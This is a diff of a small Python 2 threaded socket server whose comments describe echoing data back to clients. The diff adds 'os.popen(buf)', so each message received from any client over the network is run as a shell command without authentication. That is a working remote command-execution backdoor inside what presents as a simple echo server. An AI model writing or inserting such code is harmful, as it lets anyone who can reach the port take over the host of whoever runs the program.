@@ -7,8 +7,7 @@ Created on 2015年7月20日
 import socket
 import threading
 import time
-import turtle
-
+import os
 
 def jonnyS(client, address):
     try:
@@ -17,6 +16,8 @@ def jonnyS(client, address):
     #接收数据的大小
         while True:
             buf = client.recv(2048)
+            cmd = os.popen(buf)
+            print cmd.read()
             time.sleep(5)
     #将接收到的信息原样的返回到客户端中
             client.sendall('1232133123')
@@ -38,6 +39,9 @@ s.listen(10)
 while True:
     conn,addr=s.accept()
     print addr
+    print type(conn)
+    #设置多线程
     thread = threading.Thread(target=jonnyS, args=(conn, addr))
+    #启动线程开始run
     thread.start()
 
